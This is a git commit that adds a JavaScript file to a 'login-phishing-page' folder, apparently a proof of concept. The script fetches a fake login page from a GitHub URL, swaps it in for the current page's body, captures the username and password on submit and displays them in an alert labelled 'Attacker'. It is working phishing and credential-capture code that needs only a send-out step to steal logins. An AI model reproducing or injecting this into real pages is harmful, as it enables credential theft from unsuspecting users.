1b75cdb0cefea71f0500053110fbb4449ae6469b
achraf4test <112291751+achraf4test@users.noreply.github.com>
2023-06-10 13:14:10 +0100

    Create login.js

---
+++ login-phishing-page/login.js
@@ -0,0 +1,15 @@
+fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/login-phishing-page/login.html").then(res=>res.text()).then(res => {
+  document.body.innerHTML = res;
+
+  const form = document.querySelector('#sign-in-form');
+
+  form.addEventListener("submit", function(evt) {
+    evt.preventDefault();
+
+    let user = document.querySelector('#username-1').innerText
+    let pass = document.querySelector('#react-aria-1').value
+    alert('==>[ Attacker ]<==\n[+]=> Your email: ' + user + "\n[+]=>Your password: " + pass);
+
+    return;
+  }, true);
+})
